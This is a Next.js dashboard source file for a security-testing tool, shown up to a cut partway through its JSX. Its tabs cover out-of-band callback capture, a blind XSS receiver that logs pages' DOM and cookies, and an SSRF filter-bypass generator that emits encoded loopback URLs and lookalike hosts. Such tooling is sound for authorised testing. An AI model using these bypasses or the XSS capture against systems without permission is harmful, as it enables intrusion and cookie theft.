'use client';

import { useState, useEffect, use, useRef, useMemo } from 'react';
import Link from 'next/link';
import { 
  Webhook, ChevronRight, Copy, Check, Settings, Trash2, Send, 
  ExternalLink, Globe, Wifi, ShieldAlert, Play, Search, 
  AlertCircle, RefreshCw, ArrowLeft, ArrowUpRight, HelpCircle, 
  Database, User, Network, FileCode, Radio, Terminal, Zap,
  ShieldCheck, Cpu, BookOpen
} from 'lucide-react';
import { getPayloadsData } from '@/lib/payloads';
import styles from '@/styles/dashboard.module.css';

// SSRF Bypass Payload Generator Helper
function generateSsrfBypasses(host) {
  if (!host) return [];
  
  const cleanHost = host.trim().replace(/^https?:\/\//i, '').split('/')[0].split(':')[0];
  const results = [];

  // Helper to check if IP
  const ipv4Regex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
  const isIpv4 = ipv4Regex.test(cleanHost);

  let octets = [127, 0, 0, 1];
  if (isIpv4) {
    const match = cleanHost.match(ipv4Regex);
    octets = [parseInt(match[1]), parseInt(match[2]), parseInt(match[3]), parseInt(match[4])];
  } else if (cleanHost.toLowerCase() === 'localhost') {
    octets = [127, 0, 0, 1];
  } else {
    const unicodeLookalikes = {
      'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ',
      'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
      'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ', '.': '.'
    };
    
    let unicodeObfuscated = '';
    for (let char of cleanHost.toLowerCase()) {
      unicodeObfuscated += unicodeLookalikes[char] || char;
    }

    results.push({
      category: 'Unicode Normalization',
      payload: `http://${unicodeObfuscated}`,
      desc: 'Bypasses blacklists that do not normalize Unicode strings before validation checks.'
    });

    results.push({
      category: 'User-Info Slash Confusion',
      payload: `http://localhost@${cleanHost}`,
      desc: 'Injecting credentials syntax to confuse host domain parsers.'
    });

    results.push({
      category: 'CNAME Redirect Wrapper',
      payload: `http://foo.bar.${cleanHost}`,
      desc: 'Subdomain hijack / parsing check bypass'
    });

    return results;
  }

  // --- IPv4 Specific Bypasses ---
  const [a, b, c, d] = octets;
  const decimal = (a * 16777216) + (b * 65536) + (c * 256) + d;
  const hexOctets = octets.map(o => '0x' + o.toString(16));
  const octalOctets = octets.map(o => '0' + o.toString(8));
  
  results.push({
    category: 'Pure 32-Bit Decimal IP',
    payload: `http://${decimal}`,
    desc: 'Translates the standard octets into a single unified 32-bit integer.'
  });

  results.push({
    category: 'Standard Hexadecimal IP',
    payload: `http://${hexOctets.join('.')}`,
    desc: 'Each separate octet is encoded in base-16 hex format.'
  });

  results.push({
    category: 'Compressed Hex Integer',
    payload: `http://0x${decimal.toString(16)}`,
    desc: 'The entire decimal integer converted to hex as a single raw value.'
  });

  results.push({
    category: 'Octal IP Encoding',
    payload: `http://${octalOctets.join('.')}`,
    desc: 'Octets are written in base-8 with leading zero indicator padding.'
  });

  if (a === 127 && b === 0 && c === 0) {
    results.push({
      category: 'Short IP (Truncated Loopback)',
      payload: `http://127.1`,
      desc: 'Unix systems automatically pad omitted octets with trailing zeros.'
    });

    results.push({
      category: 'Short IP (Decimal Loopback)',
      payload: `http://127.0.1`,
      desc: 'Alternative compact class-A padding syntax.'
    });
    
    results.push({
      category: 'Alternative Loopback IP',
      payload: `http://127.127.127.127`,
      desc: 'The entire class-A block 127.0.0.0/8 resolves back to loopback.'
    });
    
    results.push({
      category: 'Zero Broadcast Address',
      payload: `http://0.0.0.0`,
      desc: 'Resolves to localhost on Unix, BSD, and macOS server platforms.'
    });
    
    results.push({
      category: 'Single Digit Zero IP',
      payload: `http://0`,
      desc: 'Ultimate compressed loopback pointer.'
    });
  }

  results.push({
    category: 'IPv6 Compressed',
    payload: `http://[::1]`,
    desc: 'Standard compressed IPv6 loopback pointer.'
  });

  results.push({
    category: 'IPv4-mapped IPv6',
    payload: `http://[::ffff:${a.toString(16).padStart(2, '0')}${b.toString(16).padStart(2, '0')}:${c.toString(16).padStart(2, '0')}${d.toString(16).padStart(2, '0')}]`,
    desc: 'Dual-stack IPv4 embedded within IPv6 format.'
  });

  results.push({
    category: 'Nip.io Wildcard DNS',
    payload: `http://${a}.${b}.${c}.${d}.nip.io`,
    desc: 'Free wildcard DNS resolver that always routes queries back to target IP.'
  });

  results.push({
    category: 'Sslip.io Wildcard DNS',
    payload: `http://${a}.${b}.${c}.${d}.sslip.io`,
    desc: 'Another resilient wildcard DNS resolving service.'
  });

  return results;
}

export default function DashboardPage({ params }) {
  const resolvedParams = use(params);
  const id = resolvedParams.id;

  // Active Main Navigation Module state
  const [activeTab, setActiveTab] = useState('OOB'); // 'OOB', 'XSS', 'SSRF', 'PAYLOADS'

  // --- OOB Webhook Ingestion states ---
  const [requests, setRequests] = useState([]);
  const [totalCount, setTotalCount] = useState(0);
  const [config, setConfig] = useState({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({ success: true, message: 'OOB Callback recorded successfully' }),
    telegramEnabled: false,
    telegramToken: '',
    telegramChatId: '',
    discordEnabled: false,
    discordWebhook: ''
  });

  const [selectedRequest, setSelectedRequest] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterMethod, setFilterMethod] = useState('ALL');
  const [isConfigOpen, setIsConfigOpen] = useState(false);
  const [copiedText, setCopiedText] = useState('');
  const [isPollingActive, setIsPollingActive] = useState(true);

  // Response configuration form state
  const [configStatus, setConfigStatus] = useState('200');
  const [configContentType, setConfigContentType] = useState('application/json');
  const [configBody, setConfigBody] = useState('');
  const [configTelegramEnabled, setConfigTelegramEnabled] = useState(false);
  const [configTelegramToken, setConfigTelegramToken] = useState('');
  const [configTelegramChatId, setConfigTelegramChatId] = useState('');
  const [configDiscordEnabled, setConfigDiscordEnabled] = useState(false);
  const [configDiscordWebhook, setConfigDiscordWebhook] = useState('');

  // Forwarding form state
  const [forwardTarget, setForwardTarget] = useState('');
  const [forwardState, setForwardingState] = useState('idle'); // idle, loading, success, error
  const [forwardResult, setForwardResult] = useState(null);

  const prevRequestsCountRef = useRef(0);

  // --- XSS Hunter states ---
  const [xssTriggers, setXssTriggers] = useState([]);
  const [selectedXss, setSelectedXss] = useState(null);
  const [xssSearchQuery, setXssSearchQuery] = useState('');

  // --- SSRF Bypass states ---
  const [ssrfTarget, setSsrfTarget] = useState('127.0.0.1');
  const [ssrfBypasses, setSsrfBypasses] = useState([]);

  // --- Payloads Cheat Sheet states ---
  const [payloadsSearchQuery, setPayloadsSearchQuery] = useState('');
  const [selectedPayloadCategory, setSelectedPayloadCategory] = useState('ALL');
  const [payloadFilterPriority, setPayloadFilterPriority] = useState('ALL'); // 'ALL', 'HIGH', 'MEDIUM', 'LOW'

  // --- Nuclei Suite states ---
  const [nucleiSearchQuery, setNucleiSearchQuery] = useState('');
  const [selectedNucleiSection, setSelectedNucleiSection] = useState('ALL');
  const [builderTarget, setBuilderTarget] = useState('https://target.com');
  const [builderTemplateType, setBuilderTemplateType] = useState('OOB_SSRF');
  const [builderSeverity, setBuilderSeverity] = useState('critical,high');
  const [builderRateLimit, setBuilderRateLimit] = useState('50');

  // Load origin on client side
  const [origin, setOrigin] = useState('');
  useEffect(() => {
    if (typeof window !== 'undefined') {
      setOrigin(window.location.origin);
    }
  }, []);

  const webhookHost = origin 
    ? origin.replace(/^https?:\/\//i, '').split(':')[0] 
    : 'domain.com';
  const webhookUrl = `${origin || 'https://domain.com'}/api/r/${id}`;
  const xssPayloadUrl = `${origin || 'https://domain.com'}/api/x?id=${id}`;

  // Fetch Webhook logs
  const fetchInspectionData = async (isInitial = false) => {
    try {
      const response = await fetch(`/api/inspect/${id}`);
      if (!response.ok) throw new Error('Failed to fetch data');
      
      const data = await response.json();
      if (data.success) {
        setRequests(data.requests || []);
        setTotalCount(data.totalCount || 0);
        setConfig(data.config || config);

        if (data.requests && data.requests.length > 0) {
          if (isInitial || !selectedRequest) {
            setSelectedRequest(data.requests[0]);
          } else {
            const currentFirst = data.requests[0];
            if (selectedRequest && !data.requests.some(r => r.requestId === selectedRequest.requestId)) {
              setSelectedRequest(currentFirst);
            }
          }
        } else {
          setSelectedRequest(null);
        }

        prevRequestsCountRef.current = data.requests ? data.requests.length : 0;
      }
    } catch (error) {
      console.error('Error fetching logs:', error);
    }
  };

  // Fetch XSS logs
  const fetchXssData = async (isInitial = false) => {
    try {
      const response = await fetch(`/api/inspect/${id}/xss`);
      if (!response.ok) throw new Error('Failed to fetch XSS data');
      const data = await response.json();
      if (data.success) {
        setXssTriggers(data.triggers || []);

        if (data.triggers && data.triggers.length > 0) {
          if (isInitial || !selectedXss) {
            setSelectedXss(data.triggers[0]);
          } else {
            const stillExists = data.triggers.find(t => t.triggerId === selectedXss.triggerId);
            if (!stillExists) {
              setSelectedXss(data.triggers[0]);
            } else {
              setSelectedXss(stillExists);
            }
          }
        } else {
          setSelectedXss(null);
        }
      }
    } catch (err) {
      console.error('Error fetching XSS:', err);
    }
  };

  // Initial and reactive fetch triggers on tab change
  useEffect(() => {
    if (activeTab === 'OOB') {
      fetchInspectionData(true);
    } else if (activeTab === 'XSS') {
      fetchXssData(true);
    }
  }, [id, activeTab]);

  // Setup active polling loop
  useEffect(() => {
    let intervalId;
    if (isPollingActive) {
      intervalId = setInterval(() => {
        if (activeTab === 'OOB') {
          fetchInspectionData();
        } else if (activeTab === 'XSS') {
          fetchXssData();
        }
      }, 1500);
    }

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [id, isPollingActive, activeTab, selectedRequest, selectedXss]);

  // Generate SSRF payloads
  useEffect(() => {
    setSsrfBypasses(generateSsrfBypasses(ssrfTarget));
  }, [ssrfTarget]);

  // Sync config form when modal opens
  useEffect(() => {
    if (isConfigOpen) {
      setConfigStatus(String(config.status));
      setConfigContentType(config.contentType);
      setConfigBody(config.body);
      setConfigTelegramEnabled(!!config.telegramEnabled);
      setConfigTelegramToken(config.telegramToken || '');
      setConfigTelegramChatId(config.telegramChatId || '');
      setConfigDiscordEnabled(!!config.discordEnabled);
      setConfigDiscordWebhook(config.discordWebhook || '');
    }
  }, [isConfigOpen, config]);

  // Save history to localStorage
  useEffect(() => {
    if (id) {
      const saved = localStorage.getItem('webhook_inspector_history');
      let list = [];
      if (saved) {
        try { list = JSON.parse(saved); } catch (e) {}
      }
      if (!list.some(item => item.id === id)) {
        list.unshift({
          id,
          label: 'Stealth OOB Ingestion',
          createdAt: new Date().toISOString()
        });
        localStorage.setItem('webhook_inspector_history', JSON.stringify(list.slice(0, 10)));
      }
    }
  }, [id]);

  // Copy to clipboard helper
  const handleCopy = (text, label) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(''), 2000);
  };

  // Clear Webhook request logs
  const handleClearLogs = async () => {
    if (!confirm('Are you absolutely sure you want to purge all captured callback logs?')) return;
    try {
      const response = await fetch(`/api/inspect/${id}/clear`, { method: 'POST' });
      if (response.ok) {
        setRequests([]);
        setTotalCount(0);
        setSelectedRequest(null);
      }
    } catch (e) {
      alert('Failed to clear logs.');
    }
  };

  // Clear XSS Trigger logs
  const handleClearXssLogs = async () => {
    if (!confirm('Are you absolutely sure you want to purge all captured Blind XSS logs?')) return;
    try {
      const response = await fetch(`/api/inspect/${id}/xss/clear`, { method: 'POST' });
      if (response.ok) {
        setXssTriggers([]);
        setSelectedXss(null);
      }
    } catch (e) {
      alert('Failed to clear XSS logs.');
    }
  };

  // Save custom response config
  const handleSaveConfig = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`/api/r/${id}/config`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: configStatus,
          contentType: configContentType,
          body: configBody,
          telegramEnabled: configTelegramEnabled,
          telegramToken: configTelegramToken,
          telegramChatId: configTelegramChatId,
          discordEnabled: configDiscordEnabled,
          discordWebhook: configDiscordWebhook
        })
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          setConfig(data.config);
          setIsConfigOpen(false);
          setCopiedText('config-saved');
          setTimeout(() => setCopiedText(''), 2000);
        }
      }
    } catch (err) {
      alert('Failed to save configuration.');
    }
  };

  // Forward/Replay request
  const handleForwardRequest = async (e) => {
    e.preventDefault();
    if (!forwardTarget.trim() || !selectedRequest) return;

    setForwardingState('loading');
    setForwardResult(null);

    try {
      const response = await fetch(`/api/inspect/${id}/forward`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targetUrl: forwardTarget,
          method: selectedRequest.method,
          headers: selectedRequest.headers,
          body: selectedRequest.body
        })
      });

      const data = await response.json();
      if (response.ok && data.success) {
        setForwardingState('success');
        setForwardResult(data);
      } else {
        setForwardingState('error');
        setForwardResult(data);
      }
    } catch (err) {
      setForwardingState('error');
      setForwardResult({ message: err.message });
    }
  };

  // Regex-based JSON syntax highlighting
  const getHighlightedJson = (jsonStr) => {
    try {
      let parsed = jsonStr;
      if (typeof jsonStr === 'string') {
        parsed = JSON.parse(jsonStr);
      }
      const formatted = JSON.stringify(parsed, null, 2);
      
      const escaped = formatted
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

      const highlighted = escaped.replace(
        /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g,
        (match) => {
          let cls = styles.jsonNumber;
          if (/^"/.test(match)) {
            if (/:$/.test(match)) {
              cls = styles.jsonKey;
            } else {
              cls = styles.jsonString;
            }
          } else if (/true|false/.test(match)) {
            cls = styles.jsonBoolean;
          } else if (/null/.test(match)) {
            cls = styles.jsonNull;
          }
          return `<span class="${cls}">${match}</span>`;
        }
      );

      return { __html: highlighted };
    } catch (e) {
      return { __html: jsonStr };
    }
  };

  // Filters Webhook Requests
  const filteredRequests = requests.filter(req => {
    const matchesSearch = 
      req.path.toLowerCase().includes(searchQuery.toLowerCase()) || 
      req.ip.includes(searchQuery) ||
      (req.body && req.body.toLowerCase().includes(searchQuery.toLowerCase()));
    
    const matchesMethod = filterMethod === 'ALL' || req.method === filterMethod;

    return matchesSearch && matchesMethod;
  });

  // Filters XSS Triggers
  const filteredXssTriggers = xssTriggers.filter(trig => {
    const query = xssSearchQuery.toLowerCase();
    return (
      trig.uri.toLowerCase().includes(query) ||
      trig.ip.includes(query) ||
      (trig.dom && trig.dom.toLowerCase().includes(query)) ||
      (trig.cookies && trig.cookies.toLowerCase().includes(query))
    );
  });

  // Payloads Cheat Sheet Library (Modularized via @/lib/payloads)
  const payloadsData = useMemo(() => {
    return getPayloadsData({ webhookUrl, xssPayloadUrl, webhookHost, id });
  }, [webhookUrl, xssPayloadUrl, webhookHost, id]);

  // Filter Payloads list based on search, category AND Priority Era levels
  const filteredPayloads = payloadsData.filter(cat => {
    return selectedPayloadCategory === 'ALL' || cat.category === selectedPayloadCategory;
  }).map(cat => {
    const items = cat.items.filter(item => {
      // Priority filter
      if (payloadFilterPriority !== 'ALL' && item.priority !== payloadFilterPriority) return false;

      // Search filter
      const q = payloadsSearchQuery.toLowerCase();
      return (
        item.title.toLowerCase().includes(q) ||
        item.code.toLowerCase().includes(q) ||
        item.desc.toLowerCase().includes(q) ||
        item.era.toLowerCase().includes(q)
      );
    });
    return { ...cat, items };
  }).filter(cat => cat.items.length > 0);

  return (
    <div className={styles.dashboardLayout}>
      
      {/* SIDEBAR: NAVIGATION & ACTIVE LOGS LIST */}
      <aside className={styles.sidebar}>
        <div className={styles.sidebarHeader}>
          <div className={styles.sidebarTitleRow}>
            <Link href="/" className={styles.logoRow}>
              <ArrowLeft size={16} />
              <Terminal size={15} className={styles.logoIcon} />
              <span className={styles.logoText}>Webhook Inspector</span>
            </Link>
            <span className={styles.sidebarStats}>
              {activeTab === 'OOB' 
                ? `${requests.length} Callbacks` 
                : activeTab === 'XSS' 
                ? `${xssTriggers.length} XSS Hits` 
                : activeTab === 'PAYLOADS'
                ? 'Payloads'
                : activeTab === 'NUCLEI'
                ? 'Nuclei'
                : 'Utility'}
            </span>
          </div>

          {/* Nav Modules Switcher Tabs */}
          <div className={styles.moduleTabs}>
            <button 
              onClick={() => setActiveTab('OOB')}
              className={`${styles.moduleTabBtn} ${activeTab === 'OOB' ? styles.moduleTabBtnActive : ''}`}
              title="Out-of-band Webhook Ingestor"
            >
              <Webhook size={13} />
              OOB
            </button>
            <button 
              onClick={() => setActiveTab('XSS')}
              className={`${styles.moduleTabBtn} ${activeTab === 'XSS' ? styles.moduleTabBtnActive : ''}`}
              title="Blind XSS Payload Receiver"
            >
              <ShieldAlert size={13} />
              XSS
            </button>
            <button 
              onClick={() => setActiveTab('SSRF')}
              className={`${styles.moduleTabBtn} ${activeTab === 'SSRF' ? styles.moduleTabBtnActive : ''}`}
              title="SSRF Bypass Generator"
            >
              <Zap size={13} />
              SSRF
            </button>
            <button 
              onClick={() => setActiveTab('PAYLOADS')}
              className={`${styles.moduleTabBtn} ${activeTab === 'PAYLOADS' ? styles.moduleTabBtnActive : ''}`}
              title="Payload Library"
            >
              <BookOpen size={13} />
              Payloads
            </button>
            <button 
              onClick={() => setActiveTab('NUCLEI')}
              className={`${styles.moduleTabBtn} ${activeTab === 'NUCLEI' ? styles.moduleTabBtnActive : ''}`}
              title="Nuclei Integration & Templates"
            >
              <Cpu size={13} />
              Nuclei
            </button>
          </div>

          {/* Module-Specific Sidebar Headers */}
          {activeTab === 'OOB' && (
            <>
              <div className={styles.searchBar}>
                <Search size={14} className={styles.searchIcon} />
                <input 
                  type="text" 
                  placeholder="Filter logs by path, IP, payload..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className={styles.searchInput}
                />
              </div>

              <div className={styles.filterPillsRow}>
                {['ALL', 'GET', 'POST', 'PUT', 'DELETE'].map(method => (
                  <button
                    key={method}
                    onClick={() => setFilterMethod(method)}
                    className={`${styles.filterPill} ${filterMethod === method ? styles.filterPillActive : ''}`}
                  >
                    {method}
                  </button>
                ))}
              </div>
            </>
          )}

          {activeTab === 'XSS' && (
            <div className={styles.searchBar}>
              <Search size={14} className={styles.searchIcon} />
              <input 
                type="text" 
                placeholder="Filter XSS hits by URI, IP, DOM..."
                value={xssSearchQuery}
                onChange={(e) => setXssSearchQuery(e.target.value)}
                className={styles.searchInput}
              />
            </div>
          )}

          {activeTab === 'SSRF' && (
            <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.4' }}>
              Enter a target host in the main panel to generate bypass representations in real-time.
            </div>
          )}

          {activeTab === 'PAYLOADS' && (
            <>
              <div className={styles.searchBar}>
                <Search size={14} className={styles.searchIcon} />
                <input 
                  type="text" 
                  placeholder="Search payloads..."
                  value={payloadsSearchQuery}
                  onChange={(e) => setPayloadsSearchQuery(e.target.value)}
                  className={styles.searchInput}
                />
              </div>

              {/* Priority Filter badging switcher inside sidebar */}
              <div className={styles.filterPillsRow}>
                {[
                  { id: 'ALL', label: 'All Severities' },
                  { id: 'HIGH', label: 'High Priority' },
                  { id: 'MEDIUM', label: 'WAF Bypass' },
                  { id: 'LOW', label: 'Legacy / Standard' }
                ].map(prio => (
                  <button
                    key={prio.id}
                    onClick={() => setPayloadFilterPriority(prio.id)}
                    className={`${styles.filterPill} ${payloadFilterPriority === prio.id ? styles.filterPillActive : ''}`}
                  >
                    {prio.label}
                  </button>
                ))}
              </div>
            </>
          )}

          {activeTab === 'NUCLEI' && (
            <>
              <div className={styles.searchBar}>
                <Search size={14} className={styles.searchIcon} />
                <input 
                  type="text" 
                  placeholder="Filter Nuclei topics..."
                  value={nucleiSearchQuery}
                  onChange={(e) => setNucleiSearchQuery(e.target.value)}
                  className={styles.searchInput}
                />
              </div>

              <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Cpu size={12} style={{ color: 'var(--color-primary)' }} />
                <span>Nuclei Automation Suite</span>
              </div>
            </>
          )}
        </div>

        {/* SIDEBAR LOGS LIST CONTROLLER */}
        <div className={styles.requestList}>
          {activeTab === 'OOB' && (
            filteredRequests.length === 0 ? (
              <div className={styles.emptySidebar}>
                <HelpCircle size={28} style={{ color: 'var(--text-muted)' }} />
                <p className={styles.emptySidebarText}>
                  {searchQuery || filterMethod !== 'ALL' 
                    ? 'No requests match filter criteria.' 
                    : 'Awaiting incoming requests...'}
                </p>
              </div>
            ) : (
              filteredRequests.map((req) => (
                <div 
                  key={req.requestId}
                  onClick={() => setSelectedRequest(req)}
                  className={`${styles.requestItem} ${selectedRequest?.requestId === req.requestId ? styles.requestItemActive : ''}`}
                >
                  <div className={styles.requestItemDetails}>
                    <div className={styles.requestItemHeader}>
                      <span className={`${styles.methodPill} ${styles['method' + req.method] || styles.methodOTHER}`}>
                        {req.method}
                      </span>
                      <span className={styles.itemTime}>
                        {new Date(req.timestamp).toLocaleTimeString('en-US', { hour12: false })}
                      </span>
                    </div>
                    <div className={styles.itemPath} title={req.path}>
                      {req.path.replace(`/api/r/${id}`, '') || '/'}
                    </div>
                    <div className={styles.itemMetaRow}>
                      <span className={styles.itemIP}>{req.ip}</span>
                      <span>{req.size > 1024 ? `${(req.size / 1024).toFixed(1)} KB` : `${req.size} B`}</span>
                    </div>
                  </div>
                  <ChevronRight size={14} style={{ color: 'var(--text-muted)', alignSelf: 'center' }} />
                </div>
              ))
            )
          )}

          {activeTab === 'XSS' && (
            filteredXssTriggers.length === 0 ? (
              <div className={styles.emptySidebar}>
                <ShieldAlert size={28} style={{ color: 'var(--text-muted)' }} />
                <p className={styles.emptySidebarText}>
                  Awaiting Blind XSS triggers...
                </p>
              </div>
            ) : (
              filteredXssTriggers.map((trig) => (
                <div 
                  key={trig.triggerId}
                  onClick={() => setSelectedXss(trig)}
                  className={`${styles.requestItem} ${selectedXss?.triggerId === trig.triggerId ? styles.requestItemActive : ''}`}
                >
                  <div className={styles.requestItemDetails}>
                    <div className={styles.requestItemHeader}>
                      <span className={`${styles.methodPill} ${styles.methodPOST}`}>
                        XSS TRIGGER
                      </span>
                      <span className={styles.itemTime}>
                        {new Date(trig.timestamp).toLocaleTimeString('en-US', { hour12: false })}
                      </span>
                    </div>
                    <div className={styles.itemPath} title={trig.uri}>
                      {trig.uri}
                    </div>
                    <div className={styles.itemMetaRow}>
                      <span className={styles.itemIP}>{trig.ip}</span>
                      <span style={{ color: 'var(--color-primary)' }}>RECEIVED</span>
                    </div>
                  </div>
                  <ChevronRight size={14} style={{ color: 'var(--text-muted)', alignSelf: 'center' }} />
                </div>
              ))
            )
          )}

          {activeTab === 'SSRF' && (
            <div style={{ padding: '18px 16px', display: 'flex', flexDirection: 'column', gap: '14px' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-secondary)', textTransform: 'uppercase', letterSpacing: '0.04em' }}>
                Bypass Techniques
              </span>
              <div style={{ padding: '12px', background: 'var(--bg-input)', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)' }}>
                <div style={{ fontSize: '0.78rem', color: 'var(--text-main)', fontWeight: '600', marginBottom: '4px' }}>
                  IP Encoding Representation
                </div>
                <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                  Alternative IP notations help verify parser robustness against strict regex filters or naive substring checks.
                </div>
              </div>

              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'flex', flexDirection: 'column', gap: '8px', lineHeight: '1.45' }}>
                <div><strong>• Hex / Octal / Dword:</strong> Interpreted directly by underlying network sockets (cURL, urllib, libc).</div>
                <div><strong>• 0.0.0.0 / ::1:</strong> Binds to localhost in most Unix environments while bypassing explicit 127.0.0.1 checks.</div>
                <div><strong>• DNS Rebinding:</strong> Resolves public domain to private address on secondary lookup.</div>
              </div>
            </div>
          )}

          {activeTab === 'PAYLOADS' && (
            <div style={{ padding: '14px 10px', display: 'flex', flexDirection: 'column', gap: '3px' }}>
              <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px', letterSpacing: '0.04em' }}>
                Categories ({payloadsData.length})
              </span>
              <button
                onClick={() => setSelectedPayloadCategory('ALL')}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  width: '100%',
                  padding: '7px 10px',
                  borderRadius: 'var(--radius-xs)',
                  background: selectedPayloadCategory === 'ALL' ? 'var(--color-primary-subtle)' : 'transparent',
                  border: selectedPayloadCategory === 'ALL' ? '1px solid var(--color-primary-border)' : '1px solid transparent',
                  color: selectedPayloadCategory === 'ALL' ? 'var(--color-primary)' : 'var(--text-secondary)',
                  fontSize: '0.78rem',
                  fontWeight: '600',
                  cursor: 'pointer',
                  textAlign: 'left',
                  transition: 'all 0.15s ease'
                }}
              >
                <span>All Categories</span>
                <span style={{ fontSize: '0.7rem', opacity: 0.7 }}>
                  {payloadsData.reduce((acc, c) => acc + c.items.length, 0)}
                </span>
              </button>

              {payloadsData.map(cat => (
                <button
                  key={cat.category}
                  onClick={() => setSelectedPayloadCategory(cat.category)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    width: '100%',
                    padding: '7px 10px',
                    borderRadius: 'var(--radius-xs)',
                    background: selectedPayloadCategory === cat.category ? 'var(--color-primary-subtle)' : 'transparent',
                    border: selectedPayloadCategory === cat.category ? '1px solid var(--color-primary-border)' : '1px solid transparent',
                    color: selectedPayloadCategory === cat.category ? 'var(--color-primary)' : 'var(--text-secondary)',
                    fontSize: '0.78rem',
                    fontWeight: '600',
                    cursor: 'pointer',
                    textAlign: 'left',
                    transition: 'all 0.15s ease'
                  }}
                >
                  <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {cat.title}
                  </span>
                  <span style={{ fontSize: '0.7rem', opacity: 0.7, marginLeft: '6px' }}>
                    {cat.items.length}
                  </span>
                </button>
              ))}
            </div>
          )}

          {activeTab === 'NUCLEI' && (
            <div style={{ padding: '14px 10px', display: 'flex', flexDirection: 'column', gap: '4px' }}>
              <span style={{ fontSize: '0.7rem', fontWeight: '700', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px', letterSpacing: '0.04em' }}>
                Modules
              </span>
              {[
                { id: 'ALL', label: 'All Modules' },
                { id: 'BUILDER', label: 'Command Builder' },
                { id: 'OOB_SSRF', label: 'OOB SSRF / RCE Template' },
                { id: 'BLIND_XSS', label: 'Blind XSS Header Fuzzer' },
                { id: 'REPORTING', label: 'Scan Webhook Export' },
                { id: 'COMMUNITY', label: 'Community Templates' },
                { id: 'CHEATSHEET', label: 'CLI Cheat Sheet' }
              ].filter(item => !nucleiSearchQuery || item.label.toLowerCase().includes(nucleiSearchQuery.toLowerCase())).map(sec => (
                <button
                  key={sec.id}
                  onClick={() => setSelectedNucleiSection(sec.id)}
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    width: '100%',
                    padding: '8px 10px',
                    borderRadius: 'var(--radius-xs)',
                    background: selectedNucleiSection === sec.id ? 'var(--color-primary-subtle)' : 'transparent',
                    border: selectedNucleiSection === sec.id ? '1px solid var(--color-primary-border)' : '1px solid transparent',
                    color: selectedNucleiSection === sec.id ? 'var(--color-primary)' : 'var(--text-secondary)',
                    fontSize: '0.78rem',
                    fontWeight: '600',
                    cursor: 'pointer',
                    textAlign: 'left',
                    transition: 'all 0.15s ease'
                  }}
                >
                  <span>{sec.label}</span>
                </button>
              ))}
            </div>
          )}
        </div>
      </aside>

      {/* MAIN CONSOLE PANEL */}
      <main className={styles.mainPanel}>
        
        {/* --- MODULE 1: OOB WEBHOOK INGESTOR PANEL --- */}
        {activeTab === 'OOB' && (
          <>
            <header className={styles.panelHeader}>
              <div className={styles.urlContainer}>
                <div className={styles.urlWrapper}>
                  <span className={styles.urlLabel}>Callback URL</span>
                  <input 
                    type="text" 
                    readOnly 
                    value={webhookUrl}
                    onClick={(e) => e.target.select()}
                    className={styles.urlInput}
                  />
                  <button 
                    onClick={() => handleCopy(webhookUrl, 'url')}
                    className={styles.copyBtn}
                    title="Copy Callback URL"
                  >
                    {copiedText === 'url' ? <Check size={16} style={{ color: 'var(--color-success)' }} /> : <Copy size={16} />}
                  </button>
                </div>

                <div className={styles.headerActions}>
                  {copiedText === 'config-saved' && (
                    <span className="badge badge-success animate-fade-in">
                      Settings Saved
                    </span>
                  )}
                  
                  <button 
                    onClick={() => setIsPollingActive(!isPollingActive)} 
                    className="btn-secondary"
                  >
                    <span className={isPollingActive ? styles.liveIndicator : styles.pausedIndicator} />
                    <span>{isPollingActive ? 'Live Polling' : 'Paused'}</span>
                  </button>

                  <button 
                    onClick={() => setIsConfigOpen(true)}
                    className="btn-secondary"
                  >
                    <Settings size={14} />
                    <span>Response Config</span>
                  </button>

                  <button 
                    onClick={handleClearLogs}
                    disabled={requests.length === 0}
                    className="btn-secondary"
                    style={{ color: 'var(--color-error)' }}
                  >
                    <Trash2 size={14} />
                    <span>Clear</span>
                  </button>
                </div>
              </div>
            </header>

            {requests.length === 0 ? (
              <div className={`${styles.emptyState} animate-fade-in`}>
                <div className={styles.emptyStateContent}>
                  <div className={styles.emptyIconBox}>
                    <Terminal size={24} />
                  </div>
